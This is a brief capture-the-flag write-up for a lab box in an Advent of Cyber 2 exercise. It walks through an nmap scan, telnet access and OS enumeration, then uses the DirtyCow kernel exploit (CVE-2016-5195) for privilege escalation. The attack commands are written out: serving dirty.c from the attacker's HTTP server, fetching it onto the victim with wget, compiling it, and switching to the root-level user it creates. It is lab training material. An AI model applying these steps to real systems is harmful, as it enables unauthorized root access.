# [Special by John Hammond] Sysadmin &amp; Combined skills 

IP: 10.10.54.125

Advent of Cyber 2: 

### Port Scanning:
- `nmap -sC -sV 10.10.54.125`
- `telnet` is deprecated.

### Initial Access
- *Connect to this service to see if you can make use of it. You can connect to the service with the standard command-line client, named after the name of the service, or netcat with syntax like this:*
- I needed to install telnet.
- `telnet 10.10.54.125 <port>` (this case it's 23)

### Enumeration
- `cat /etc/*release`: see the ubuntu version
- `uname -a`: kinda 
- `cat /etc/issue`: description
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- Answer 1: `ubuntu 12.04`
- `cat cookies_and_milk.txt`
- Answer 2 (who got here first?): `grinch`
- `That C source code is a portion of a kernel exploit called DirtyCow. Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in the Linux Kernel, taking advantage of a race condition that was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.`
- https://dirtycow.ninja/
- Start a Python http server on our machine: `python -m SimpleHTTPServer 8000`
- I downloaded a `dirty.c` from github at place it in our machine.
- On the victim's machine: `wget http://10.2.51.175:8000/dirty.c`
- `gcc -pthread dirty.c -o dirty -lcrypt`

### Privilege Escalation
- Run the c code
- The new user is `firefart`
- Switch to the new user `su firefart`
- `cd /root`
- `cat message_....txt`
- `touch coal`
- `tree | md5sum` which is the flag itself! :D
